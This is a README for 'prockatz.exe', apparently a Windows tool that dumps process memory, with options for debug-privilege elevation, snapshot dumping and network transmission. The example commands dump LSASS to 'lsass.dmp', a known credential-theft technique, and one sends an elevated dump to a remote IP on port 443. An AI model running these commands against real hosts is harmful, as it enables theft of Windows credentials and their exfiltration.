
# Process Dump Tool

## Overview
This tool provides the functionality to create memory dumps of processes on Windows systems. It can handle privileged processes by setting `SeDebugPrivilege`, supports snapshot creation for non-invasive dumping, and can send dumps over the network.

## Features
- **Enable debug Privileges**: Gain `SeDebugPrivilege` to handle privileged processes.
- **Network Transmission**: Send process dumps to a specified IP and port.
- **Snapshot Creation**: Create a snapshot of the process for a non-intrusive dump.
- **Support for both PID and Process Name**: Specify the target for dumping either by PID or process name.


## Usage
- `-h, --help`: Show help message and exits.
- `-v, --version`: Print version information and exits.
- `--pid`: Specify the Process ID to dump. [nargs=0..1] [default: 0]
- `--procname`: Specify the name of the process. [nargs=0..1] [default: ""]
- `--dmp`: Specify the file name to dump the process. [nargs=0..1] [default: ""]
- `--ip`: Specify the IP address to send the dump. [nargs=0..1] [default: ""]
- `--port`: Specify the port to send the dump. [nargs=0..1] [default: ""]
- `--elevate`: Set SeDebugPrivilege to dump privileged processes. [OPTIONAL]
- `--snapshot`: Creates a snapshot of the process before dumping it. [OPTIONAL]

## Examples

### Dumping a Process by PID
``prockatz.exe --pid 1000 --dmp lsass.dmp``

### Dumping a Process by Name
``prockatz.exe --procname "example.exe" --dmp "lsass.dmp"``

### Dumping a Process by PID with Elevated Privileges
``prockatz.exe --pid 1000 --dmp lsass.dmp --elevate``


### Sending a Dump Over the Network
``prockatz.exe --pid 1000 --ip 192.168.0.105 --port 443 --elevate``


### Creating a Snapshot and Dumping
``prockatz.exe --pid 1000 --dmp lsass.dmp --elevate --snapshot``


## Acknowledgments
- **Argparse Library**: This tool uses the `argparse` library by Ranav for parsing command line arguments. More information can be found at [argparse on GitHub](http://github.com/p-ranav/argparse).


